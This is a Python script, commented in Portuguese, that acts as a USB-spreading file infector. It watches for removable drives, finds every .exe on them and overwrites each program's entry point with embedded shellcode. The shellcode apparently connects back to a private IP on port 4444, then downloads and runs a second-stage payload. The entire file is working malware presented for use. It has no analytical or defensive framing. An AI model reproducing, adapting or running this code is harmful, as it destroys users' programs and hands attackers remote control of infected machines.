import pywintypes, win32api, win32file, pefile, time, os

print("[*] - Inicializando...\n")

buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xd4\x80\x68\x02"
buf += b"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += b"\x53\xff\xd5"

def infecta(arquivos):
	for arquivo in arquivos:
		try:
			# instaciamos um objeto pe e incluimos o arquivo que vamos modificar
			pe = pefile.PE(arquivo)
			# Acessamos o cabeçalho opcional e no endereço onde fica o codido do programa colocamos nosso codigo
			ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint 
			print('\tEscrevendo {} bytes no deslocamento {}'.format(len(buf), hex(ep)))
			# setamos os bytes no deslocamento
			pe.set_bytes_at_offset(ep, buf)
			# salvamos no arquivo as nossa alteraçoes
			pe.write(arquivo)
		except Exception as e:
			# caso dê merda!
			print('\t[!] - Erro ao tentar escrever no arquivo ==> %s'%(e))

def lista_exe(driver):
	# pegamos cada arquivos do pen drive
	for arquivos in os.walk(driver+':'):
		# a lista de arquivos começa a apartir do indice 2 entao...
		for arquivo in arquivos[2]:
			# se fatiarmos o texto e pegarmos no indice 1, podemos verificar se é um executavel ou não
			if os.path.splitext(arquivo)[1] == '.exe' or os.path.splitext(arquivo)[1] == '.EXE':
				# retorna D:\\teste.exe
				file_path = arquivos[0] + "\\" + arquivo
				yield file_path

print("\tDetectando drivers...\n")
# criamos uma lista vazia dos pen drives que ja foram infectados
lista_pendrive_infectado = []
# lista dos drivers antes de entrar no loop
drivers_antigo = win32api.GetLogicalDriveStrings()
while True:
	# lista de drivers no loop
	lista_drivers = win32api.GetLogicalDriveStrings()
	# se os drivers antigos forem diferentes dos novos...
	if drivers_antigo != lista_drivers:
		for driver in lista_drivers:
			# se o driver ja foi infectado e não esta na lista de drivers antigos...
			if driver in lista_pendrive_infectado and driver not in drivers_antigo:
				# remove ele da lista pode ser outro pen drive com a mesma nomenclatura
				lista_pendrive_infectado.remove(driver)
		# atualiza
		drivers_antigo = lista_drivers
	for driver in lista_drivers:
		# se o driver nunca foi infectado
		if driver not in lista_pendrive_infectado:
			# verificamos se o tipo dele é pen drive ou seja tipo 2
			if win32file.GetDriveType(driver+':') == 2:
				# chamamos a função que vai buscar os executaveis e depois infecta-los...
				infecta(lista_exe(driver))
				# apos isso adicionamos ele a lista
				lista_pendrive_infectado += driver
				print("\tTodos os arquivos foram infectados com sucesso")
	# tempo para evitar sobre carga
	time.sleep(0.3)
